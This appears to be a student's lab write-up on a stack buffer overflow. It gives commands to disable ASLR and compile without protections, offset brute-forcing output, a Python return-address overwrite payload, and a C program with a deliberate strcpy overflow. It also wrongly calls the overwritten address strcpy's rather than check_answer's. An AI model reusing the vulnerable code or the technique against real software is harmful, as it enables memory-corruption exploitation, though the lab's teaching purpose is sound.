# Lab3 - Buffer overflow

# Simple buffer overflow example

* To disable ASLR(Address Space Layout Randomization) 
cat /proc/sys/kernel/randomize_va_space # Write down val
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space


* What are we going to do?
This example shows that after call strcpy function, just exit program not returning to the point it was called.
To do that, we need to overwrite the return address of strcpy function.

* Overview of process 
1. Set a address you want to jump. In this example, we just want to find out the address where the program exit immediately. Later on, this address will be the address you want to execute!!
2. Find where the strcpy return address is.(It's a brute force method)
3. And then, run the c program with the user input which contains the address what you decided in Step 1.

* Steps in detail
1. Compile the c program below like this. '-z execstack' marks the stack as executable.
```
gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
```

2. Execute below to find out the address we want to jump. As you can see, 0x080485b3 is the address we want to jump!
```
[02/09/22]seed@VM:Byeongchan$ objdump -D ans_check5 | grep -B 1 exit

08048400 <exit@plt>:
--
 80485b3:	6a 00                	push   $0x0
 80485b5:	e8 46 fe ff ff       	call   8048400 <exit@plt>
[02/09/22]seed@VM:Byeongchan$
```

3. Find out where the return address of strcpy function is! This is where brute force method comes in! Try like below changing the number of print count. If the program ended without printing 'About to exit!', that means return address was corrupted and the program was killed by the system.
```
[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*47")
ans_buf is at address 0xbf88027c
Right answer!
About to exit!
Segmentation fault
[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*48")
ans_buf is at address 0xbf8fe32c
Segmentation fault

```

4. Run like below. Python code will create meaning-less characters followed by exit return address. That return address will overwrite the return address of strcpy. If the program exit without 'Segmentation fault', then you found the right place!!!
```
ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
```


# ans_check5.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_answer(char *ans) {

  int ans_flag = 0;
  char ans_buf[32];

  printf("ans_buf is at address %p\n", &ans_buf);

  strcpy(ans_buf, ans);

  if (strcmp(ans_buf, "forty-two") == 0)
    ans_flag = 1;

  return ans_flag;

}

int main(int argc, char *argv[]) {

  if (argc < 2) {
    printf("Usage: %s <answer>\n", argv[0]);
    exit(0);
  }
  if (check_answer(argv[1])) {
    printf("Right answer!\n");
  } else {
    printf("Wrong answer!\n");
  }
  printf("About to exit!\n");
  fflush(stdout);
}
```





```


  
```


